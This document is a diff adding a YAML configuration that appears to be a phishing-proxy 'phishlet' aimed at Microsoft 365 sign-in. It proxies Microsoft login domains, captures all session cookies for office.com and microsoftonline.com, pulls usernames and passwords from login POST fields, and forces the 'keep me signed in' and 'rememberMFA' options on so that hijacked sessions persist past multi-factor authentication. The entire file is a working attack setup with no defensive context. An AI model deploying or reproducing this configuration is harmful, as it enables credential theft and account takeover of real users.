@@ -1,0 +1,64 @@
+name: 'o365'
+author: '@lol'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'logincdn', orig_sub: 'logincdn', domain: 'msftauth.net', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'live', orig_sub: 'login', domain: 'live.com', session: false, auto_filter: true, is_landing:false}
+  - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing:true}
+  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: false, is_landing:true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing:true}
+
+
+sub_filters:
+
+auth_tokens:
+  - domain: 'www.office.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.office.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.login.microsoftonline.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: '.microsoftonline.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'    
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+
+auth_urls:
+  - '/common/login'
+
+force_post:
+  - path: '/kmsi'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+    type: 'post'
+  - path: '/common/SAS'
+    search:
+      - {key: 'rememberMFA', search: '.*'}
+    force:
+      - {key: 'rememberMFA', value: 'true'}
+    type: 'post'
